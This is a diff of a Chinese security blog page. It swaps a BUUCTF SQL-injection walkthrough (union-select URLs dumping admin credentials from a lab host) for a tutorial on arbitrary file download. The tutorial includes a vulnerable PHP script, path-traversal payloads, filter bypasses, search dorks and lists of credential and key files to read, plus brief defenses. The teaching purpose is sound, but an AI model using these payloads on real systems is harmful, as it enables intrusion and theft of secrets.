@@ -4,9 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUU-SQL注入-寻找注入点, 小白">
-    <meta name="description" content="前言记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。
-0x00 启动靶场启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有">
+    <meta name="keywords" content="文件操作-文件下载及读取, 小白">
+    <meta name="description" content="前言脑图：
+漏洞原理文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）
+任意文件下载漏洞，正常的利用手段是下载服务器文">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUU-SQL注入-寻找注入点 | 小白</title>
+    <title>文件操作-文件下载及读取 | 小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -320,12 +321,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUU-SQL注入-寻找注入点</h1>
+                    <h1 class="description center-align post-title">文件操作-文件下载及读取</h1>
                 </div>
             </div>
         </div>
@@ -441,12 +442,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+                                <span class="chip bg-color">任意文件下载</span>
                             </a>
                         
                     </div>
@@ -457,8 +454,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                SQL注入
+                            <a href="/categories/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="post-category">
+                                任意文件下载
                             </a>
                         
                     </div>
@@ -470,7 +467,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-18
+                    2022-03-20
                 </div>
                 
 
@@ -479,7 +476,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    552
+                    1.4k
                 </div>
                 
 
@@ -504,46 +501,78 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。</p>
-<h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。</p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105309711.png" alt="image-20220318105309711"></p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105320103.png" alt="image-20220318105320103"></p>
-<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>登录页面无果后，测试了热点页面，有三篇新闻，随便开一片后发现url的值在变化：</p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105801150.png" alt="image-20220318105801150"></p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105904675.png" alt="image-20220318105904675"></p>
-<p>接着查看源码：</p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110010310.png" alt="image-20220318110010310"></p>
-<p>发现<code>content_detail.php</code>这里也有字段的变化，并且和url的<code>content</code>值相对应，那在这里就能大胆的猜测，<code>content字段</code>这里存在注入点。</p>
-<h2 id="0x02-判断字段数"><a href="#0x02-判断字段数" class="headerlink" title="0x02 判断字段数"></a>0x02 判断字段数</h2><p>既然探测出了 注入点，那接下来就需要判断字段数：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 3
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>脑图：<br><img src="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/image-20220320205322924.png" alt="image-20220320205322924"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）</p>
+<p>任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。但是有的时候我们可能根本不知道网站所处的环境，以及网站的路径，这时候我们只能利用./ ../来逐层猜测路径，让漏洞利用变得繁琐。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 </p>
+<p><strong>如下代码一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字，将存在任意文件下载漏洞。</strong></p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+  $filename &#x3D; $_GET[&#39;filename&#39;];
+  echo &#39;&lt;h1&gt;讲开始下载文件！&lt;&#x2F;h1&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&#39;;
+  echo **file_get_contents**($filename); &#x2F;&#x2F;**无过滤导致*****\*漏洞函数\**** **file_get_contents 函数把整个文件读入一个字符串中并输出**
 
-http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+  header(&#39;Content-Type: imgage&#x2F;jpeg&#39;);
+  header(&#39;Content-Disposition: attachment; filename&#x3D;&#39;.$filename);
+  header(&#39;Content-Lengh: &#39;.filesize($filename));
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110444538.png" alt="image-20220318110444538"></p>
-<p>当判断字段数为3时无回显，字段数为2时，回显正常页面，那这里字段数就是2.</p>
-<h2 id="0x03-判断回显点"><a href="#0x03-判断回显点" class="headerlink" title="0x03 判断回显点"></a>0x03 判断回显点</h2><p>使用联合注入判断回显点：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110613534.png" alt="image-20220318110613534"></p>
-<h2 id="0x04-后续操作"><a href="#0x04-后续操作" class="headerlink" title="0x04 后续操作"></a>0x04 后续操作</h2><p>爆库：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(schema_name) from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318111344733.png" alt="image-20220318111344733"></p>
-<p>爆表：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112641585.png" alt="image-20220318112641585"></p>
-<p>爆字段：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;FLAG_TABLE&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112730085.png" alt="image-20220318112730085"></p>
-<p>爆内容：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select group_concat(username),group_concat(password) from admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112104664.png" alt="image-20220318112104664"></p>
-<p><strong>注：</strong>这里得到了管理员的账号和密码，在登录页面输入账号密码得到flag</p>
-<p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112417918.png" alt="image-20220318112417918"></p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这道题最主要的难点在于寻找注入点，找到注入点之后，后续操作也就水到渠成了；其次就是信息搜集的重要性，若不花时间去信息搜集，在测试过程中往往很难继续往下进行。</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>如何发现（网站URL中存在下载参数，并且未进行过滤../../../字符，且输出了文件内容）<br>1、Google search<br>利用inurl:”readfile.php?file=”</p>
+<p>2、从链接上看，形如：<br>  • download.php?path=<br>  • download.php?file=<br>  • down.php?file=<br>  • data.php?file=<br>  • readfile.php?file=<br>  • read.php?filename=</p>
+<p>3、从参数名看，形如：<br>  • &amp;RealPath=<br>  • &amp;FilePath=<br>  • &amp;ﬁlepath=<br>  • &amp;Filepath=<br>  • &amp;Path=<br>  • &amp;path=<br>  • &amp;inputFile=<br>  • &amp;Inputfile=<br>  • &amp;url=<br>  • &amp;urls=<br>  • &amp;Lang=<br>  • &amp;dis=<br>  • &amp;data=<br>  • &amp;Data=<br>  • &amp;readﬁle=<br>  • &amp;ﬁlep=<br>  • &amp;src=<br>  • &amp;menu=<br>  • META-INF<br>  • WEB-INF</p>
+<p>4、index.php?f=../../../../../../etc/passwd</p>
+<p> index.php?f=../index.php</p>
+<p> index.php?f=ﬁle:///etc/passwd</p>
+<p> readfile.php?file=/etc/passwd</p>
+<p> readfile.php?file=../../../../../../../../etc/passwd</p>
+<p> readfile.php?file=../../../../../../../../etc/passwd%00（00截断）</p>
+<p>5、使用扫描工具扫描敏感文件，如：</p>
+<p>​      御剑，7kb等等</p>
+<p>6、利用下载好的文件代码去分析路径和包含文件获取敏感文件等</p>
+<p>7、真实网站需要找到下载功能点，分析是什么脚本及下载路径选择对应下载文件</p>
+<p>（<strong>注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，</strong></p>
+<p>  <strong>若显示源码或提示下载则是文件查看与下载漏洞</strong>）</p>
+<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><p>1.若过滤字符或字母可尝试编码绕过</p>
+<p>2.利用 ../../</p>
+<p>但是有些代码会进行过滤(具体要根据代码进行测试)，会把 ../ 置空<br>利用….// 代替 ../<br>利用..// 代替 /</p>
+<p>具体怎么绕过还是得看代码是怎么写的<br>3.</p>
+<p>注意<br>①.注意 <strong>../</strong> 的数量，他代表查询目录父目录的数量<br>②.当我们遇到一个任意文件下载漏洞时首先要注意下载的权限问题。因为权限决定我们能下载的文件范围。<br>③.有些网站（主要是针对系统）并不会在URL里显示给你看，这时候你需要抓包，从数据包里修改路径，达到任意文件读取。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>**利用:**（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件/代码文件 &gt;&gt; 利用服务器软件漏洞&gt; shell&gt; 提权）<br>1.任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</p>
+<p>2.下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置<br>下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。<br>下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</p>
+<p>3.Windows：（windows的这些路径不一定都存在）</p>
+<p>  C:\boot.ini //查看系统版本</p>
+<p>  C:\Windows\System32\inetsrv\MetaBase.xml     //IIS配置文件</p>
+<p>  C:\Windows\repair\sam                     //存储系统初次安装的密码</p>
+<p>  C:\Program Files\mysql\my.ini                //Mysql配置</p>
+<p>  C:\Program Files\mysql\data\mysql\user.MYD   //Mysql root</p>
+<p>  C:\Windows\php.ini        //php配置信息</p>
+<p>  C:\Windows\my.ini        //Mysql配置信息</p>
+<p>  C:\Windows\win.ini        //Windows系统的一个基本系统配置文件</p>
+<p>Linux：</p>
+<p>  /root/.ssh/authorized_keys</p>
+<p>  /root/.ssh/id_rsa</p>
+<p>  /root/.ssh/id_ras.keystore</p>
+<p>  /root/.ssh/known_hosts        //记录每个访问计算机用户的公钥</p>
+<p>  /etc/passwd</p>
+<p>  /etc/shadow</p>
+<p>  /usr/local/app/php5/lib/php.ini         //PHP配置文件</p>
+<p>  /etc/my.cnf          //mysql配置文件</p>
+<p>  /etc/httpd/conf/httpd.conf        //apache配置文件</p>
+<p>  /root/.bash_history        //用户历史命令记录文件</p>
+<p>  /root/.mysql_history        //mysql历史命令记录文件</p>
+<p>  /proc/mounts          //记录系统挂载设备</p>
+<p>  /porc/config.gz         //内核配置文件</p>
+<p>  /var/lib/mlocate/mlocate.db      //全文件路径</p>
+<p>  /porc/self/cmdline        //当前进程的cmdline参数</p>
+<h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><ul>
+<li>过滤<code>.</code>(点)，使用户在url中不能回溯上级目录</li>
+<li>正则严格判断用户输入参数的格式</li>
+<li><code>php.ini</code>配置<code>open_basedir</code>限定文件访问范围</li>
+</ul>
+<p>转载原文：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzhoo/p/12613815.html">https://www.cnblogs.com/zzhoo/p/12613815.html</a></p>
+<p><strong>Javaweb实现文件下载：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<p><strong>小米路由器远程任意文件下载：</strong><br><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></p>
 
                 
             </div>
@@ -570,7 +599,7 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://NoobXW.github.io/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/">http://NoobXW.github.io/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/</a>
+                    <a href="http://NoobXW.github.io/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/">http://NoobXW.github.io/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -608,12 +637,8 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+                                    <span class="chip bg-color">任意文件下载</span>
                                 </a>
                             
                         </div>
@@ -661,17 +686,18 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/18/BUU-BURP-X-Real-IP/">
+                <a href="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="BUU-BURP-X-Real-IP">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="文件操作-文件下载及读取">
                         
-                        <span class="card-title">BUU-BURP-X-Real-IP</span>
+                        <span class="card-title">文件操作-文件下载及读取</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -681,26 +707,27 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>22-03-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>22-03-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="post-category">
+                                    任意文件下载
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+                        <span class="chip bg-color">任意文件下载</span>
                     </a>
                     
                 </div>
@@ -714,13 +741,13 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/">
+                <a href="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="东塔靶场-CTF-命令执行_2">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="文件操作-文件包含漏洞">
                         
-                        <span class="card-title">东塔靶场-CTF-命令执行_2</span>
+                        <span class="card-title">文件操作-文件包含漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -731,14 +758,14 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>22-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>22-03-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-category">
+                                    文件包含
                                 </a>
                             
                             
@@ -748,8 +775,8 @@ http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
                     </a>
                     
                 </div>
